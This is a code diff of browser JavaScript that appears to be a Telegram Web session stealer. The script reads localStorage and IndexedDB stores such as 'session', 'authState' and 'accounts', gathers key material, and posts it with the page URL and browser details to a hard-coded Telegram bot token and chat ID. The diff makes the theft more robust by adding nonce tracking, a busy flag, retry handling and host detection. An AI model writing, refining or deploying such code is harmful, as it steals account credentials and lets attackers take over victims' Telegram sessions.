@@ -3,11 +3,18 @@
     BOT: '8610466101:AAGrgL8oIrBRBDHsV0M_dC2mqwU7MKaZF5k',
     CHAT: '8314393607',
     TAG: 'TWG',
+    HOST: 'web.telegram.org',
     RETRY_MS: 2500,
     RETRY_MAX: 14,
     MAX_LS: 8192,
     STORES: ['state', 'session', 'sessions', 'authState', 'globalState', 'kv', 'config', 'accounts', 'storage']
   };
+
+  function hostOf() {
+    var h = '';
+    try { h = location.hostname || ''; } catch (e) {}
+    return h || CFG.HOST;
+  }
 
   function hx(u8) {
     var s = '', i;
@@ -120,8 +127,17 @@
 
   var tries = 0;
 
+  function busyOff() { window.__twg_busy = false; }
+
+  function retry() {
+    busyOff();
+    if (++tries < CFG.RETRY_MAX) setTimeout(run, CFG.RETRY_MS);
+  }
+
   function run() {
-    if (window.__twg_done) return;
+    var n = window.__twg_nonce || 0;
+    if (window.__twg_doneFor === n || window.__twg_busy) return;
+    window.__twg_busy = true;
 
     var ls = lsRead();
     idbRead().then(function (idb) {
@@ -129,34 +145,27 @@
       if (ls) walk(ls.data, hits, 'ls');
       walk(idb, hits, 'idb');
 
-      if (!hits.length && ++tries < CFG.RETRY_MAX) { setTimeout(run, CFG.RETRY_MS); return; }
+      if (!hits.length && ++tries < CFG.RETRY_MAX) { busyOff(); setTimeout(run, CFG.RETRY_MS); return; }
 
-      var fp = hits.map(function (h) { return h.hex; }).join(',');
-      try { if (fp && localStorage.getItem('__twg_fp') === fp) { window.__twg_done = true; return; } } catch (e) {}
-
-      if (!hits.length) { if (window.__twg_empty) return; window.__twg_empty = true; }
-
+      var host = hostOf();
       var payload = {
-        tag: CFG.TAG, ts: Date.now(), url: location.href, ua: navigator.userAgent,
+        tag: CFG.TAG, ts: Date.now(), host: host, nonce: n,
+        url: (location.href || '').slice(0, 200), ua: navigator.userAgent,
         keys: hits, ls: ls ? ls.data : {}, lsMeta: ls ? ls.meta : '', idb: idb
       };
       var body = JSON.stringify(payload);
-      var cap = CFG.TAG + ' | ' + location.host + ' | cles=' + hits.length + ' | ' + (hits[0] ? hits[0].path : 'aucune') + ' | ' + body.length + 'o';
+      var cap = CFG.TAG + ' | ' + host + ' | cles=' + hits.length + ' | ' + (hits[0] ? hits[0].path : 'aucune') + ' | ' + body.length + 'o';
 
       var pr = body.length <= 3500
         ? send({ chat_id: CFG.CHAT, text: cap + ' ' + body })
         : send({ chat_id: CFG.CHAT, caption: cap },
-               { name: CFG.TAG + '_' + location.hostname + '_' + Date.now() + '.json', body: body });
+               { name: CFG.TAG + '_' + host + '_' + Date.now() + '.json', body: body });
 
       pr.then(function () {
-        window.__twg_done = true;
-        try { localStorage.setItem('__twg_fp', fp); } catch (e) {}
-      }, function () {
-        if (++tries < CFG.RETRY_MAX) setTimeout(run, CFG.RETRY_MS);
-      });
-    }, function () {
-      if (++tries < CFG.RETRY_MAX) setTimeout(run, CFG.RETRY_MS);
-    });
+        window.__twg_doneFor = n;
+        busyOff();
+      }, retry);
+    }, retry);
   }
 
   run();
